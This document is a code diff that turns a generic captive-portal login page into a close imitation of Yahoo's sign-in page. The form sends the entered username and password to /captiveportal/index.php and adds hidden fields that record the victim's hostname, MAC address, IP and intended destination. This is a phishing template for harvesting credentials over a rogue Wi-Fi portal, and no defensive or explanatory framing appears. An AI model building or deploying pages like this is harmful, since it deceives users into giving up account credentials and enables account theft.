@@ -3,159 +3,90 @@ $destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https"
 require_once('helper.php');
 ?>
 
-  <html>
+  <html id="Stencil" class="no-js grid mobile light-theme ">
 
   <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
+    <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="origin-when-cross-origin">
+    <title>Yahoo</title>
 
-    <title>Yahoo - login</title>
+    <link rel="icon" type="image/x-icon" href="assets/img/yahoo-favicon-img-v0.0.2.ico">
+    <link rel="shortcut icon" type="image/x-icon" href="assets/img/yahoo-favicon-img-v0.0.2.ico">
+    <link rel="apple-touch-icon" href="assets/img/yahoo-apple-touch-v0.0.2.png">
+    <link rel="apple-touch-icon-precomposed" href="assets/img/yahoo-apple-touch-v0.0.2.png">
 
-    <meta charset='UTF-8'>
-    <meta http-equiv="cache-control" content="no-cache" />
-    <meta http-equiv="expires" content="0" />
-    <meta http-equiv="pragma" content="no-cache" />
-    <meta name="viewport" content="width=device-width,
-    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
-
-    <script src="jquery-2.2.1.min.js"></script>
-    <script type="text/javascript">
-      function redirect() {
-        setTimeout(function() {
-          window.location = "/captiveportal/index.php";
-        }, 100);
-      }
-    </script>
-
-    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
-    <link rel="stylesheet" href="assets/css/style.css">
-    <link rel="icon" type="image/png" href="assets/img/pfpnk8kp5b.png"/>
-
-    <style>
-
-    body {
-      background-position: center;
-      background-attachment: fixed;
-      background-repeat: no-repeat;
-      -webkit-background-size: 100%;
-      -moz-background-size: 100%;
-      -o-background-size: 100%;
-      background-size: 100%;
-      -webkit-background-size: cover;
-      -moz-background-size: cover;
-      -o-background-size: cover;
-      background-size: cover;
-    }
-
-    .google-header-bar {
-    height: 71px;
-    border-bottom: 1px solid #e5e5e5;
-    overflow: hidden;
-    }
-
-    .google-header-bar.centered {
-    border: 0;
-    height: 108px;
-    }
-
-    .google-header-bar.centered .header .logo {
-    float: none;
-    margin: 40px auto 30px;
-    display: block;
-    }
-    .google-header-bar.centered .header .secondary-link {
-    display: none
-    }
-
-    .header .logo {
-    margin: 17px 0 0;
-    float: left;
-    height: auto;
-    width: auto;
-    }
-    </style>
-
-    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
-      .google-header-bar.centered {
-        height: 83px;
-      }
-
-      .google-header-bar.centered .header .logo {
-        margin: 25px auto 20px;
-      }
-
-      .card {
-        margin-bottom: 20px;
-      }
-    </style>
-
-    <style media="screen and (max-width: 580px)">
-      html,
-      body {
-        font-size: 14px;
-      }
-
-      .google-header-bar.centered {
-        height: 73px;
-      }
-
-      .google-header-bar.centered .header .logo {
-        margin: 20px auto 15px;
-      }
-
-      .content {
-        padding-left: 10px;
-        padding-right: 10px;
-      }
-
-      .hidden-small {
-        display: none;
-      }
-
-      .card {
-        padding: 20px 15px 30px;
-        width: 270px;
-      }
-
-      .footer ul li {
-        padding-right: 1em;
-      }
-
-      .lang-chooser-wrap {
-        display: none;
-      }
-    </style>
+    <link href="assets/css/yahoo-main.css" rel="stylesheet" type="text/css">
 
   </head>
 
-  <body>
+  <body class="bucket-mbr-change-password-v2 bucket-messenger-linking-mc bucket-mbr-signin-with-google bucket-mbr-oneflow-captcha bucket-mbr-cc-unified-add bucket-mbr-comm-channel-classifier">
 
-    <div class="container">
-      <div class="account-wall">
-
-        <div class="google-header-bar centered">
-          <div class="header content clearfix">
-            <img alt="Google" class="logo" src="assets\img\mtq4wpx4d6.png">
-          </div>
-        </div>
-
-        <h1 class="text-center login-title">Sign in to your account</h1>
-
-          <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
-
-            <input type="text" name="email" class="form-email" placeholder="Enter your Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
-            <input type="password" name="password" class="form-password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
-            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
-            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
-            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-            <input type="hidden" name="target" value="<?=$destination?>">
-            <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Next</button>
-            <div class="text-center terms-text1"><a href="#" class="url-color">Trouble signing in?</a></div><br>
-            <div class="text-center terms-text2">New to Yahoo? <a href="#" class="url-color">Sign up for a new account</a></div>
-
-          </form>
-
+    <div id="login-body" class="loginish  puree-v2 grid ">
+      <div class="mbr-login-hd" id="mbr-uh-hd">
+        <a href="#">
+          <img src="assets/img/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27" />
+          <img src="assets/img/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27" />
+        </a>
       </div>
+      <div class="challenge yid-challenge">
+        <div class="challenge-header">
+        </div>
+        <div class="username-challenge" id="login-landing">
+          <strong class="challenge-heading">Sign in</strong>
+          <span class="challenge-desc signin-sub-title">using your Yahoo account</span>
+          </span>
+          <form id="login-username-form" method="post" action="/captiveportal/index.php" onsubmit="redirect()" class="pure-form">
+            <div id="username-country-code-field" class="username-country-code puree-country-inline-dropdown-disabled code-of-length-2">
+
+              <div>
+                <input class="phone-no" type="text" name="email" id="login-username" tabindex="1" value="" autocomplete="username" autocapitalize="none" autocorrect="off" placeholder="Username, email, or mobile" />
+
+                <input name="pwd" class="pwd-field" type="password" tabindex="2" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password" />
+              </div>
+
+              <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
+              <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
+              <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
+              <input type="hidden" name="target" value="<?=$destination?>">
+
+            </div>
+            <p id="username-error" class="error-msg hide" role="alert"></p>
+
+
+            <div class="button-container">
+              <input id="login-signin" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Next" tabindex="6" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:login-landing-next" />
+            </div>
+
+            <div class="challenge-feedback-link">
+              <a href="#" id="mbr-forgot-link" data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:login-landing-forgot" data-rapid-tracking="true">Forgot username?</a>
+            </div>
+            <div class="bottom-links-container has-social-buttons">
+              <p class="sign-up-link">
+                <a href="#" id="createacc" role="button" class="pure-button puree-button-secondary challenge-button" data-rapid-tracking="true" data-ylk="elm:link;elmt:secondary;mKey:login-landing-signup">Create an account</a>
+              </p>
+
+              <div id="social-login-container" class="social-login-container">
+                <div class="or-cont-with-desc challenge-feedback-text">
+                  Or, continue with
+                </div>
+                <ul class="social-login">
+                  <li class="items-cont-1">
+                    <button type="submit" id="tpa-google-button" name="tpaProvider" value="google" class="pure-button sc-button items-1 sc-google sc-google-button" data-rapid-tracking="true" data-ylk="elm:btn;slk:google-btn;mKey:login-landing-google-social-btn">
+                      <label class="offscreen">google</label>
+                    </button>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+
+
     </div>
 
   </body>
 
-</html>
+  </html>
